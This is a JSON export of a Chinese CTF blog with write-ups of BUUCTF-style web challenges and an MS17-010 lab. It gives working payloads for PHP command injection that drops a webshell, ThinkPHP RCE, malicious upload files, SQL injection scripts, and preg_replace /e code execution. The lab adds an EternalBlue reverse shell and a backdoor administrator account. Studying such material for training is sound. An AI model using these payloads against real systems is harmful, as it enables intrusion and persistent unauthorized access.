[{"title":"buuoj-z7z8","date":"2020-10-08T13:56:01.000Z","path":"2020/10/08/buuoj-z7z8/","text":"buuoj–杂七杂八 [BUUCTF 2018]Online Tool123456789101112131415161718&lt;?phpif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123; $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];&#125;if(!isset($_GET['host'])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET['host']; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']); echo 'you are in sandbox '.$sandbox; @mkdir($sandbox); //创建了路径 chdir($sandbox); echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host);&#125; 前面的两段代码没啥用，主要是后面处理 $host的过程 1.知识储备 escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。 escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。 反斜线（\\）会在以下字符之前插入： &amp;#;|*?~&lt;&gt;^()[]{}$`, \\x0A 和 \\xFF。 &#39; 和 &quot; 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 namp命令 -T5 :扫描等级,越大越快,越快越不安全,最好设置为-T4-sT :TCP connent 扫描,不太安全(留下记录信息),而且速度较慢,一般先使用-sS测试-Pn :禁用ping-host-timeout 2:设置扫描一台主机的时间，以毫秒为单位。-F :快速扫描模式，只扫描在nmap-services文件中列出的端口。 漏洞点在这 echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host); 这有个system来执行命令，而且有传参，肯定是利用这里了 2.构造payload 传入的参数是：172.17.0.2&#39; -v -d a=1 经过escapeshellarg处理后变成了&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1&#39;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。 经过escapeshellcmd处理后变成&#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;，这是因为escapeshellcmd对\\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php 最后执行的命令是curl &#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;，由于中间的\\\\被解释为\\而不再是转义字符，所以后面的&#39;没有被转义，与再后面的&#39;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\\ -v -d a=1&#39;，即向172.17.0.2\\发起请求，POST 数据为a=1&#39; 回到mail中，我们的 payload 最终在执行时变成了&#39;-fa&#39;\\\\&#39;&#39;\\( -OQueueDirectory=/tmp -X/var/www/html/test.php \\)@a.com\\&#39;，分割后就是-fa\\(、-OQueueDirectory=/tmp、-X/var/www/html/test.php、)@a.com&#39;，最终的参数就是这样被注入的。 参考 需要绕过上面的两个函数，先试试两个函数的作用 12345678&lt;?php$host = \" 1'shellcode \";$host = escapeshellarg($host);echo $host;echo \"\\n\";$host = escapeshellcmd($host);echo $host;?&gt; 12' 1'\\''shellcode '' 1'\\\\''shellcode \\' 构造的一句话木马为：&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39; 运行结果为：&#39; &#39;\\\\&#39;&#39;\\&lt;\\?php eval\\(\\)\\;\\?\\&gt; -oG 1.php &#39;\\\\&#39;&#39; &#39; 这里的单引号都是成对出现的，所以没影响 payload: 1?host=' &lt;?php @eval($_POST[\"hack\"]);?&gt; -oG hack.php ' 上传文件的保存路径，利用蚁剑链接一下 参考： https://blog.csdn.net/qq_26406447/article/details/100711933 https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase (写的有点乱) [BJDCTF 2nd]old-hack打开页面出现了提示 这里应该是php5的漏洞利用，和攻防世界的一道题比较像传送门 先看看报错信息:1 url+?s=1 php版本为5.0.23，上网搜了一下这版本的漏洞 https://xz.aliyun.com/t/3845 直接构造payload，读取目录 12urlPOST:_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls &#x2F; 看到了flag文件 读取flag 12urlPOST:_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=cat /flag [MRCTF2020]Ez_bypassI put something in F12 for you 123456789101112131415161718192021222324252627282930include 'flag.php';$flag='MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;';if(isset($_GET['gg'])&amp;&amp;isset($_GET['id'])) &#123; $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo 'You got the first step'; if(isset($_POST['passwd'])) &#123; $passwd=$_POST['passwd']; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); &#125; else &#123; echo \"can you think twice??\"; &#125; &#125; else &#123; echo 'You can not get it !'; &#125; &#125; else &#123; die('only one way to get the flag'); &#125; &#125; else &#123; echo \"You are not a real hacker!\"; &#125;&#125; else &#123; die('Please input first');&#125;&#125; 先F12找一找提示，原来就是格式化好的源码 if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) 直接使用数组绕过，也可以使用md5强碰撞的两字符串 12param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 if (!is_numeric($passwd))弱类型比较，使用1234567a绕过 payload: 12345678?id=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;gg=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2POST:passwd=1234567a或者?id[]=1&amp;gg[]=2POST:passwd=1234567a [安洵杯 2019]easy_weburl中包含/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=，仔细看TXpVek5UTTFNbVUzTURabE5qYz0其实是base64编码，解码还是base64，继续解码为一串十六进制的字符，内容为555.png 通过555.png--&gt;TXpVek5UTTFNbVUzTURabE5qYz0可以类型的构造出index.php查询代码 1234567index.php696e6465782e706870Njk2ZTY0NjU3ODJlNzA2ODcwTmprMlpUWTBOalUzT0RKbE56QTJPRGN3 base64解码后 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header('content-type:text/html;charset=utf-8');$cmd = $_GET['cmd'];if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');$file = hex2bin(base64_decode(base64_decode($_GET['img'])));$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);if (preg_match(\"/flag/i\", $file)) &#123; echo '&lt;img src =\"./ctf3.jpeg\"&gt;'; die(\"xixiï½ no flag\");&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo \"&lt;img src='data:image/gif;base64,\" . $txt . \"'&gt;&lt;/img&gt;\"; //将555.png的内容以base64形式显示 echo \"&lt;br&gt;\";&#125;echo $cmd;echo \"&lt;br&gt;\";if (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i\", $cmd)) &#123; //cmd参数进行了过滤 echo(\"forbid ~\"); echo \"&lt;br&gt;\";&#125; else &#123; if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) &#123;// md5强碰撞 echo `$cmd`; &#125; else &#123; echo (\"md5 is funny ~\"); &#125;&#125;?&gt;&lt;html&gt;&lt;style&gt; body&#123; background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC;&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 1234$file = hex2bin(base64_decode(base64_decode($_GET['img'])));//这里将img的值两次base64解码后赋值给了file变量...$txt = base64_encode(file_get_contents($file));//这里存在file_get_contents()函数，直接读取文件的内容 这题还对一些系统命令进行了过滤，这里需要想办法绕过 ls，不可以使用，但是dir没有过滤，可以使用dir%20/读取目录 cat被过滤了，但是可以使用ca\\t绕过，ca\\t%20/flag (linux命令中可以加\\) if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) md5强碰撞的字符串 12a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 参考： https://www.jianshu.com/p/21e3e1f74c08 [BJDCTF2020]Mark loves cat变量覆盖 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude 'flag.php';$yds = \"dog\";$is = \"cat\";$handsome = 'yds';foreach($_POST as $x =&gt; $y)&#123;//$flag=flag $$x = $y;&#125;$flag = flag foreach($_GET as $x =&gt; $y)&#123; //yds=flag $$x = $$y; //$yds = $flag &#125;foreach($_GET as $x =&gt; $y)&#123; if($_GET['flag'] === $x &amp;&amp; $x !== 'flag')&#123; // yds=flag exit($handsome); &#125;&#125;if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag']))&#123; exit($yds);&#125;if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag')&#123; exit($is);&#125;echo \"the flag is: \".$flag; poyload: 12?yds=flagPOST: $flag=flag","tags":[{"name":"shell","slug":"shell","permalink":"https://sunzhengyu99.github.io/tags/shell/"}]},{"title":"buuoj-LFI","date":"2020-10-08T12:35:05.000Z","path":"2020/10/08/buuoj-LFI/","text":"","tags":[{"name":"LFI","slug":"LFI","permalink":"https://sunzhengyu99.github.io/tags/LFI/"}]},{"title":"buuoj-upload","date":"2020-10-08T12:34:58.000Z","path":"2020/10/08/buuoj-upload/","text":"buuoj-upload [MRCTF2020]你传你🐎呢先上传一个图片，发现上传成功了，还给出了文件的保存路径 再尝试上传1.php但是出现了，报错提示 首先尝试的是，将Content-Type: image/jpeg改为图片类型，但是还是无法上传 再尝试一下.htaccess文件 文件内容 \"a.jpg\">12SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt; 上传成功后，再上传包含一句话木马的 a.jpg文件，.htaccess文件的作用就是将指定类型的文件当作php文件运行 所以表面上是jpg类型的文件，但是是当作php文件 上传成功后，蚁剑访问url+/upload/3af588e32ac72180588d18d5c3b470b4/a.jpg 密码为：cmd [SUCTF 2019]CheckIn试着上传php文件，提示非法后缀名，继续修改后缀名，发现php3,php5,phtml等可执行文件后不可上传 想到上传.htacess文件，但是也提示了非法后缀名，这个方法行不通了 但是之前做upload-labs中还有一个上传.user.ini的文件 .user.ini是什么 这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。 .user.ini的作用 可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell 传送门 开始做题 上传.user.ini文件 GIF89a是GIF文件内容开头的几个字符，其作用是为类绕过exif_imagetype() 上传1.gif 文件保存的路径已经给出，开始蚁剑链接的连接是 1url/uploads/04b0951938d905b41348c1548f9c338b/1.gif 但是一直连接不上 后来链接index.php才连接上，这里想到了.user.ini作用，是让所有的php文件包含整个一句话木马，而这里文件路径存在一个index.php，所有说index.php中也存在这个一句话木马 1/uploads/04b0951938d905b41348c1548f9c338b/index.php","tags":[{"name":".htacess","slug":"htacess","permalink":"https://sunzhengyu99.github.io/tags/htacess/"},{"name":".user.ini","slug":"user-ini","permalink":"https://sunzhengyu99.github.io/tags/user-ini/"}]},{"title":"buuoj","date":"2020-10-05T10:29:30.000Z","path":"2020/10/05/buuoj/","text":"buuoj–注入篇 [CISCN2019 华北赛区 Day2 Web1]Hack World给了提示，All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39; 猜测flag在flag 表中，查询语句应该是 select flag from flag 经过测试，发现这题过滤了很多关键字，or,union,order等，猜测是盲注 构造盲注语句 id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2) 两次的提示语句不一样，说明这个注入语句是对的，且当提示Hello时应该是对的。 12345678910111213141516171819202122232425// 二分注入import requestsurl = \"http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php\"data = &#123;id : \"\"&#125;flag = \"\"for i in range(50): right = 33 left = 128 mid = (right + left) &gt;&gt; 1 while(right&lt;left): data[\"id\"] = \"if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)\".format(i,mid) response = requests.post(url,data=data) if \"Hello\" in response.text: right = mid+1 else: left = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag)print(flag) [极客大挑战 2019]HardSQL报错注入 测试发现 or,union,substr,空格,/**/等都被加入黑名单，双写也无法绕过 可是使用报错注入 报错注入原理： 其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。 相关链接 https://www.cnblogs.com/richardlee97/p/10617115.html https://www.jianshu.com/p/d8ae3e8dabdc https://blog.csdn.net/qq_37873738/article/details/88042610 UPDATEXML (XML_document, XPath_string, new_value);第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) 。第三个参数：new_value，String格式，替换查找到的符合条件的数据 查询语句如下 12345?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23 这里会发现flag显示不全，可能是报错现实的字数限制，利用right/left函数，显示部分的flag，之后拼接起来 显示后面的flag 1?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)),0x7e),1))%23 [网鼎杯 2018]Fakebooksql注入+反序列化+代码审计 [GXYCTF2019]BabySQli下载的源码，有助于后面做题 123456789101112131415161718192021222324252627282930313233mysqli_query($con,'SET NAMES UTF8');$name = $_POST['name'];$password = $_POST['pw'];$t_pw = md5($password); //对传入的password参数进行了md5加密$sql = \"select * from user where username = '\".$name.\"'\";// echo $sql;$result = mysqli_query($con, $sql);if(preg_match(\"/\\(|\\)|\\=|or/\", $name))&#123; // 过滤了() | = or die(\"do not hack me!\");&#125;else&#123; if (!$result) &#123; printf(\"Error: %s\\n\", mysqli_error($con)); exit(); &#125; else&#123; // echo '&lt;pre&gt;'; $arr = mysqli_fetch_row($result); // print_r($arr); if($arr[1] == \"admin\")&#123; if(md5($password) == $arr[2])&#123; // echo $flag; &#125; else&#123; die(\"wrong pass!\"); &#125; &#125; else&#123; die(\"wrong user!\"); &#125; &#125;&#125; 随便输入用户名和密码，查看源码，出现提示 试了试应该是base32，解码后是base64 1c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw== 继续解码 1select * from user where username = '$name' 注入点是name参数这里，与上面源码中的查询语句一样。 经过测试发现有三列，name=admin&#39; union select 1,2,3 #&amp;pw=as#显示正常，name=admn&#39; union select 1,2,3,4#&amp;pw=as报错 但是页面没有数字回显，所以常规的注入应该是不行的。 值得注意的是，这题可以知道username是admin， 输入username=admin&amp;password=11,时提示wrong pass! 输入username=admn&amp;password=11,时提示wrong user!，所以可以判断用户名为admin 接下来介绍一种新的union注入 先建立一张表 1select * from test where id=0 union select 1,'admin','2322'; union语句后查询的是表中不存在的一个数据，查询结果如下 这个结果说明，union查询一个不存在的数据时，会建立一个虚拟表，其中放着所查询到的数据和union后包含的数据 这里就是 id=1,username=admin,password=2322 这样就可以利用这个改变数据库中用户的密码，然后用自己设置的密码登录 接下来，利用这点做这个题目，首先知道一共三列，第一列应该是id，知道之后两列的内容就可以了 name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11提示的wrong user! name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11提示的wrong pass! 第二列的字段名应该就是username，第三列自然就是password，但是这题的password字段存放的时md5加密后的内容（看到师傅们的wp才知道的，看到源码也确实这样，但是在比赛的时候这么发现不得而知） payload: 1name=000'union select 1,'admin','b59c67bf196a4758191e42f76670ceba'#&amp;pw=1111 b59c67bf196a4758191e42f76670ceba是1111的md5值，pw的值为1111","tags":[{"name":"二分注入","slug":"二分注入","permalink":"https://sunzhengyu99.github.io/tags/%E4%BA%8C%E5%88%86%E6%B3%A8%E5%85%A5/"},{"name":"报错注入","slug":"报错注入","permalink":"https://sunzhengyu99.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"},{"name":"union新姿势","slug":"union新姿势","permalink":"https://sunzhengyu99.github.io/tags/union%E6%96%B0%E5%A7%BF%E5%8A%BF/"}]},{"title":"BJDCTF2020","date":"2020-09-28T12:26:38.000Z","path":"2020/09/28/BJDCTF2020/","text":"BJDCTF-web easy md5F12看到了提示，给出了sql语句 1Hint: select * from 'admin' where password=md5($pass,true) 这里是将输入的密码进行了一次md5的加密 md5()函数介绍 这里的参数raw=true ，所以是将我们输入的密码加密16字符二进制格式，如果想完成注入，则md5值经过hex转成字符串后为 ‘or’…….这样的字符串，只要出现了or，且or后面的值为真即可完成注入。 select * from &#39;admin&#39; where password=&#39; or &#39;sdaa 这里经常使用的字符串是ffifdyop，该字符串md5加密后若raw参数为True时会返回 ‘or’6&lt;trash&gt; (&lt;trash&gt;其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的&lt;trash&gt;会在MySQL将其转换成整型比较时丢掉) 查询语句为 select * from &#39;admin&#39; where password=&#39;or&#39;6&lt;trash&gt;&#39;此查询语句结果为真 提交 ffifdyop后会跳转到另外的页面，查看源码 这里直接利用md5()函数不能处理数组的特性，get提交 ?a[]=1&amp;b[]=2 接下来还有一次跳转，直接post param1[]=1&amp;param2[]=2，拿到flag 不过如此123456789101112131415161718&lt;?phperror_reporting(0);$text = $_GET[\"text\"]; //get 获取一个参数text 使用data伪协议$file = $_GET[\"file\"]; //file参数，这里可以使用filter伪协议读取php页面源码if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"I have a dream\"))&#123; //text 的内容位I have a dream echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; if(preg_match(\"/flag/\",$file))&#123; //file参数不能包含flag die(\"Not now!\"); &#125; include($file); //next.php 提示了下一个页面的名字 &#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 看到了file参数，想到了文件包含的漏洞利用于是构造以下的payload: ?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read/convert.base64-encode/resource=next.php 对到了index.php页面的base64源码，解码后如下 index.php 1234567891011121314151617181920&lt;?php$id = $_GET['id'];$_SESSION['id'] = $id;function complex($re, $str) &#123; return preg_replace( '/(' . $re . ')/ei', 'strtolower(\"\\\\1\")', $str );&#125;foreach($_GET as $re =&gt; $str) &#123; echo complex($re, $str). \"\\n\";&#125;function getFlag()&#123; @eval($_GET['cmd']);&#125; 利用preg_replace()使用的/e模式可以存在远程执行代码 在next.php在输入 1next.php?\\S*=$&#123;getFlag()&#125;&amp;cmd=system(\"cat /flag\"); php伪协议 preg_replace /e模式漏洞详解","tags":[{"name":"md5","slug":"md5","permalink":"https://sunzhengyu99.github.io/tags/md5/"},{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"php伪协议","slug":"php伪协议","permalink":"https://sunzhengyu99.github.io/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"}]},{"title":"网安作业","date":"2020-09-27T14:21:14.000Z","path":"2020/09/27/homework/","text":"MS17-010 1.准备工作开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方 将两台虚拟机桥接到同一网卡，并保证能够通信 Kali IP 10.1.1.1 255.0.0.0 win7 IP 10.1.1.2 255.0.0.0 测试两台主机之间的通信情况 使用msf前需要开启postgresql服务 开启服务：service postgresql start 查看服务状态：service postgresql status 开到绿色字体的active即为开启了 初始化数据库：msfdb init 2. 攻击过程(1).首先判断目标主机是否打开445端口使用nmap+ip 扫描 (2) .确认目标主机打开445端口后直接使用msf进行攻击输入msfconsole 启动ｍｓｆ 输入search MS17-010 找到exploit windows/smb/ms17_010_eternalblue, 运行 1use exploitwindows/smb/ms17_010_eternalblue 输入 show options 查看需要配置哪些信息 RHOSTS 为目标主机IP(10.1.1.2) RPORT 为目标端口号(445) LHOST 为监听主机IP(10.1.1.1) (3). 配置成功后设置tcp连接输入命令 1set payload windows/x64/meterpreter/reverse_tcp (4).开始运行输入 exploit/run 成功获取shell 查看ip地址验证是否为目标主机。 (5)设立后门，在目标主机中创建一个用户创建一个用户 1net user test abc123.com /add Username:test password:abc123.com 将该用户加入管理员组，使其拥有管理员权限 1net localgroup administrtors test /add 目标主机上用户创建成功 实验结束","tags":[{"name":"msf","slug":"msf","permalink":"https://sunzhengyu99.github.io/tags/msf/"}]},{"title":"cumtctf","date":"2020-09-27T13:26:44.000Z","path":"2020/09/27/cumtctf/","text":"CUMTCTF-wp Web签到提示GET一个1,那就 url+?1 提示post一个2 那就post一个 注意的是要2=任意字符才出现源码 审计代码，这里应该是利用file_get_contents()的漏洞直接读网页源码，并且提示flag在flag.php,直接php://filter/read=convert.base64-encode/resource=flag.php，读取base64源码之后解码即可 PD9waHANCgkkZmxhZz0iQ1VNVENURnsxNzkwNTViNC1lOGY1LTQyZDItYmZlNC0wMjdkMTVlOTQ2YjJ9Ijs= babysql首先判断是否存在注入username=admin&amp;password=pw&#39; 在后面加上单引号后出现报错提示，确认有注入点 但是继续测试 &#39;or 1=1 #会出现 判断存在黑名单过滤。 接下来就是判断是将什么加入黑名单了，经过字典测试发现是空格，这里可以使用/**/绕过。 先测试有多少列，&#39;union/**/select/**/1,2,3,4,5,6,7# 到第七的时候，页面报错。 &#39;union/**/select/**/1,2,3,4,5,6,7,8# 到第八的时候显示下图，说明一共八列，并且第四列出现回显。 爆表 1username=admin&amp;password=pw'union/**/select/**/1,2,3,group_concat(TABLE_NAME),5,6,7,8/**/from/**/information_schema.TABLES/**/where/**/TABLE_SCHEMA=database()# 爆列名 1username=admin&amp;password=pw'union/**/select/**/1,2,3,group_concat(COLUMN_NAME),5,6,7,8/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_NAME='users'# user_id,first_name,last_name,user,password,avatar,last_login,failed_login列名很多，选择password 爆flag 1username=admin&amp;password=pw'union/**/select/**/1,2,3,group_concat(password),5,6,7,8/**/from/**/users# secret扫描一下目录发现存在一个www.zip的文件，直接下载得到源码，下面就是一层一层的绕过 123456789101112131415161718192021222324252627282930313233&lt;?phperror_reporting(0);include_once('flag.php');if(isset($_GET['param1']))&#123; $str1=$_GET['param1']; if(file_get_contents($str1)!=='Suvin_wants_a_girlfriend') die(\"Suvin doesn't like you\"); if(isset($_GET['param2']))&#123; $str2=$_GET['param2']; if(!is_numeric($str2)) die('Suvin prefers strings of Numbers'); else if($str2&lt;3600*24*30) die('Suvin says the num is too short'); else if($str2&gt;3600*24*31) die('Suvin says the num is too long'); else &#123; echo \"Suvin says he's falling in love with you!\".\"&lt;/br&gt;\"; sleep(intval($str2)); &#125; if (isset($_POST['param1']) &amp;&amp; isset($_POST['param2'])) &#123; $str1=$_POST['param1']; $str2=$_POST['param2']; if(strlen($str1)&gt;1000) die(\"It's too long\"); if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2))) echo $flag; else die(\"It's so similar to md5\"); &#125; &#125;&#125;?&gt; 首先get方式获取两个参数，param1要等于那个字符串，这里使用php的data伪协议 param2要在3600*24*30和3600*24*31之间，可以取2.6e6,这两个参数绕过后，就要绕过下面的post方式上传的两个值 对parame1的长度进行了限制，并且两参数的字符串形式不相等，sha1的值要相等，首先想到的是与md5函数一样，使用数组绕过，但是这题没那么简单，试了很多次都不行。网上搜了一下，发现了一个很类似的题目（sha1弱碰撞），其中也给出符合要求的字符串。 点这里 完整的payload： ?param1=data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k&amp;param2=0.26e7 12POST:param1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;param2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 还有一个很坑的地方，hackbar上传时没有作用，只能用bp抓包上传，抓包时注意先随便post一个参数，这样数据包才是post方式，然后贴上上面的两个参数值 babysql2查询语句与第一个注入相同，但是这题不给回显，猜测是盲注，但是好像过滤了更多的关键字 在1的基础上额外过滤了 ‘ ， ascii ， mid ， substr ，关闭了报错回显和输出，但是查询成功或者失败 回显不同，因此可以bool注入。 123456789101112131415161718192021222324252627url = 'http://219.219.61.234:20004/'password = \"\"string = [ord(i) for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz!_@-&#125;&#123;']#将字母转换为ascii码a = '0x5e' # '\\'的ascii码值while(1): for j in string: if (hex(j)[2:]=='7b'): str='5c'+hex(j)[2:] #将'&#123;'转义， else: str=hex(j)[2:] time.sleep(0.1) payload 